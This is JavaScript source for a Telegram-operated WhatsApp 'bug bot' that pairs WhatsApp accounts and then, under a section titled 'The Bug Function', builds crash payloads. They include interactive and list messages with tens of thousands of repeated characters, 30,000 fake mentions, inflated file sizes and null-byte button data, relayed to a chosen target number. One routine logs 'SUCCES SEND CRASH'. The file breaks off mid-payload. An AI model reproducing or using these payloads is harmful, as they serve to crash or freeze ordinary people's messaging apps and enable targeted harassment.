//Created By NeptunusXD
// Tele oaner: t.me/NeptunusXD
// WhatsApp owner: wa.me/6288214466258

const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync('./assets/images/thumb.jpeg');
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "only.json";

function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup;
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!isOnlyGroupEnabled()) return false;
  return msg.chat.type === "private";
}

let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./premium.json');
ensureFileExists('./admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
initializeWhatsAppConnections();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠴⠶⠖⠒⠛⣿⣽⡟⠛⠓⠒⠶⠶⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠴⣯⠏
⠀⠀⢿⣯⣿⠷⣶⣤⡴⣶⣶⣤⠤⠤⣤⣄⡀⠀⣀⡤⠶⠛⠉⠀⠀⠀⠀⠀⠀⠴⠿⣼⠿⠦⠀⠀⠀⠀⠀⠀⠉⠛⠲⢦⣄⣀⣤⣴⠒⣻⣿⣿⢻⣿⣿⣿⠋⣩⣴⠋⠀
⠀⠀⠀⠙⠿⣦⣼⣟⢷⣷⢹⣿⣌⣿⡟⢺⣿⠛⠻⣄⠀⠀⠀⠀⢀⣠⣤⠤⠖⠒⠒⠛⠒⠒⠒⠦⠤⣤⣀⠀⠀⢀⣤⠖⠛⢿⣇⠐⡾⣷⣿⡟⢚⣿⣷⣿⠶⠋⠁⠀⠀
⠀⠀⠀⠀⠀⠈⠙⠛⠛⠻⠾⢿⣾⣮⣗⣸⣿⣆⠄⠀⠙⣦⡖⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢉⣷⡟⠀⡀⢨⣽⣿⣽⣶⢿⡿⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠛⠉⠙⠻⢿⣷⣶⡂⣸⡟⠓⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠛⣧⣄⣿⣾⣿⡋⠉⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠁⠀⠀⠀⣠⠾⣿⣿⣿⣿⡁⠀⠈⢳⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠋⠀⠀⣿⣿⣿⣫⣶⠟⢦⡀⠀⠀⣀⠹⣆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡼⢿⡷⣾⠀⢀⡞⠁⠀⠹⡄⢻⣿⣿⡆⠀⠘⣿⣦⣤⣀⣀⠀⠀⣀⣀⣤⣶⣿⡯⠀⢀⣾⣿⡿⠋⢀⡞⠀⠀⠙⢆⣀⣿⣻⣯⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡾⠷⠛⢳⡞⣻⠋⠀⠀⠀⠀⢳⡀⢻⣿⣿⣦⣠⣿⡯⣷⡉⣽⠿⠿⠟⠉⣹⡯⣿⣷⣤⣾⣿⣿⠁⠀⣼⠃⠀⠀⠀⠈⠻⡍⠏⠁⠉⢷⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡾⠁⠀⠀⠈⡱⠁⠀⠀⠀⠀⠀⠈⢷⠈⣿⣿⣿⠟⣿⣇⡝⣮⡈⠀⠀⠀⣴⡟⠀⢿⡟⢿⣻⣿⣇⠀⣰⠇⠀⠀⠀⠀⠀⠀⠙⡄⠀⠀⠀⢿⡀⠀⠀⠀
⠀⠀⠀⠀⠀⣼⠇⠀⠀⠀⡼⠃⠀⠀⠀⣀⣀⣠⣤⣼⠿⣿⢿⠃⣰⠋⠈⠁⢻⡙⢶⣴⠟⣹⠃⠀⠀⠱⡄⢹⣿⣟⠲⢿⠤⠤⣤⣤⣀⡀⠀⠀⠸⡆⠀⠀⠈⣧⠀⠀⠀
⠀⠀⠀⠀⢠⡏⠀⠀⠀⣰⣃⣤⠖⠋⣉⡡⢆⣠⠟⠁⣼⣿⡿⢸⣇⠶⠊⠀⢸⣷⠛⠉⢳⣿⠀⠀⠐⢶⠹⡌⣿⡿⣆⠈⠱⢦⡐⠦⣄⣉⣙⣶⣄⣹⡀⠀⠀⢸⡇⠀⠀
⠀⠀⠀⠀⣾⠀⠀⢰⣶⣿⣿⣿⡿⢿⣥⣶⣟⣁⣠⣞⣽⠟⡇⢸⣿⡀⣀⡴⠋⢹⡄⠀⣸⣉⣻⣦⣄⣸⣰⡇⣿⢹⣮⣷⣤⣤⣿⠿⠞⣛⣿⣿⣿⣿⡿⠂⠀⠀⢿⠀⠀
⠀⠀⠀⠀⡟⠀⠀⠀⢹⠋⠳⢿⣿⣷⡶⠦⢭⣽⣾⣿⡟⠰⢷⣘⣿⠁⠿⠋⠉⠙⣿⠉⡿⠉⠉⠉⠏⢩⣿⢠⣟⣐⣿⣿⢷⣾⣷⣒⣩⣿⠿⠟⠉⠀⢱⠀⠀⠀⢸⠀⠀
⠀⠀⠀⢠⡇⠀⠀⠀⢸⠀⠀⠀⠈⠙⠻⠿⢿⣿⣿⣿⡟⣠⣾⣳⣽⣷⣦⢠⠄⣖⢹⣿⠃⠃⠠⠂⣰⣿⣿⢿⣧⣄⣻⣿⣿⣛⠟⠛⠋⠀⠀⠀⠀⠀⢸⡄⠀⠀⢸⡇⠀
⠀⠀⠀⢸⡇⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⢀⣸⠿⠋⢻⣿⣿⣿⣿⡽⣽⣾⣿⣦⣬⠞⠏⠀⢤⣼⣿⣿⣿⢱⣿⣿⣿⣿⡆⠈⠙⠲⣤⡀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢸⡇⠀
⠀⠀⠀⠀⡇⢰⣄⣤⣾⠀⠀⠀⢀⣠⠶⠋⠁⠀⢀⣾⣿⢿⣿⣾⣇⢹⡏⣻⣿⠞⠀⠀⠀⠰⣿⣏⣸⡇⣾⣿⣿⣿⣿⣿⠀⠀⠀⠀⠙⠳⢦⣀⠀⠀⢸⢳⣦⡞⢸⡇⠀
⠀⠀⠀⠀⣷⡼⣯⡽⢿⣆⣤⣞⣋⣀⣀⣀⣀⣀⣸⣿⣿⣧⠬⠹⣯⣬⣿⠉⠹⣄⠀⠀⠀⣰⠏⠉⣿⢤⣿⠟⠲⣾⣿⣻⣧⣤⣤⣤⡤⠤⠤⠽⠿⢦⡼⠛⣷⠛⢿⠀⠀
⠀⠀⠀⠀⢻⡄⠘⠃⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣷⣄⠀⢻⣿⠏⢦⠀⠈⠐⠀⠸⡁⠀⡟⠙⣿⠟⠀⣠⣾⣿⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠙⢀⡿⠀⠀
⠀⠀⠀⠀⠘⣇⠀⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣷⣄⠿⣄⠈⢿⡆⠀⠀⠀⢴⡿⠀⣠⠟⣠⣾⣿⢿⡽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⣸⠇⠀⠀
⠀⠀⠀⠀⠀⢹⡆⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⢿⣶⡈⢦⢸⡇⠀⢠⠀⢸⡇⠐⢁⣼⣿⢿⣯⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠁⠀⠀⢠⡏⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢶⣿⣿⣳⠀⠀⡇⠀⣼⠀⢸⡇⠀⣜⣿⣹⠶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠁⠀⠀⢀⡿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣯⡃⢸⡇⠀⢹⠂⠈⡇⠀⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠀⠀⠀⢠⡞⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣽⠷⣼⠃⠀⠀⠀⠀⢷⡰⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⠁⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣄⠀⠀⠀⠀⠙⢦⣀⠀⠀⠀⠀⠀⠀⠀⢿⣴⣿⣦⣀⣠⣀⣤⣿⣧⢾⠆⠀⠀⠀⠀⠀⠀⠀⣠⠶⠃⠀⠀⠀⢀⡼⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀⣆⣉⣷⢦⣀⠀⠀⠀⠀⢸⡜⠿⣷⣿⣿⠿⣽⡿⠛⡞⠀⠀⠀⠀⢀⣠⣴⢊⣁⠀⠀⠀⢀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⣄⣠⢿⣩⡷⡄⠈⠙⠓⠤⢤⣀⣙⣦⣈⣻⣦⣾⣁⣠⣞⣁⣀⠤⠴⠚⠋⣀⣿⣻⣧⡀⣀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠦⣟⡀⠀⠀⠀⠀⠀⠀⠀⠉⠉⢿⡿⠷⣿⢿⡯⠉⠉⠀⠀⠀⠀⠀⠉⠉⣿⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠶⣄⣀⡀⠀⠀⠀⠀⠀⠙⣶⡿⢸⠇⠀⠀⠀⠀⣀⣠⠴⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠒⠒⠲⢾⣟⡥⠿⠒⠒⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));

console.log(chalk.bold.blue(`
( ☠️) - 𝐍𝐄𝐏𝐓𝐔𝐍𝐄 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 V1.0
═════════════════════════
`));
};

startBot();




let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`◇ 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 ${botNumber}..... 𝙨𝙪𝙘𝙘𝙚𝙨\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`◇ 𝙎𝙪𝙘𝙘𝙚𝙨 𝙥𝙧𝙤𝙨𝙚𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜\`\`\`
𝙔𝙤𝙪𝙧 𝙘𝙤𝙙𝙚 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

const GetXiau = JSON.stringify({
    status: true,
        criador: "GetSuzoXopown",
          resultado: {
    type: "md",
    ws: {
    _events: { "CB:ib,,dirty": ["Array"] },
    _eventsCount: 800000,
    _maxListeners: 0,
    url: "wss://web.whatsapp.com/ws/chat",
                                  config: {
                      version: ["Array"],
                      browser: ["Array"],
                      waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                      sockCectTimeoutMs: 20000,
                      keepAliveIntervalMs: 30000,
                      logger: {},
                      printQRInTerminal: false,
                      emitOwnEvents: true,
                      defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                       linkPreviewImageThumbnailWidth: 192,
                       transactionOpts: { Object: "transactionOptsData" },
                       generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
                }
               }
             }
          });
          


// -------( Fungsional Function Before Parameters )--------- \\
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://qu.ax/bFgFd.jpg",
        "https://qu.ax/TgfrM.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn
let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await sock.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}





// ---------( The Bug Function)---------- \\

async function OverParams(target) {
                let msg = await generateWAMessageFromContent(
                target,
                {
                viewOnceMessage: {
                message: {
                   interactiveMessage: {
                      header: {
                      title: "",
                      hasMediaAttachment: false,
            },
               body: {
                text: "🦄 - ты мертв",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: GetXiau + "\u0000",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: GetXiau + "🦄 - ты мертв",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function gladiator(target, mention = true) {
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(95000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "𝐕͢𝐢͡𝐧͜𝐜͢𝐞͡𝐧͜𝐭 ⍣᳟ 𝐆͜𝐞͢𝐭𝐒͡𝐮𝐙𝐨༑⃟⃟🎭",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "𝐕͢𝐢͡𝐧͜𝐜͢𝐞͡𝐧͜𝐭 ⍣᳟ 𝐆͜𝐞͢𝐭𝐒͡𝐮𝐙𝐨༑⃟⃟🎭"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Xiee-leee🕸️" },
                        content: undefined
                    }
                ]
            }
        );
    }
    console.log(chalk.bold.red('SUCCES SEND CRASH'));
}

async function killui(target, Ptcp = true) {
      await sock.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: 'https://files.catbox.moe/k65fvb.jpg',
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "饝箔饝箔饾棩饾棶饾棿饾\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: [target, "6289526156543@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
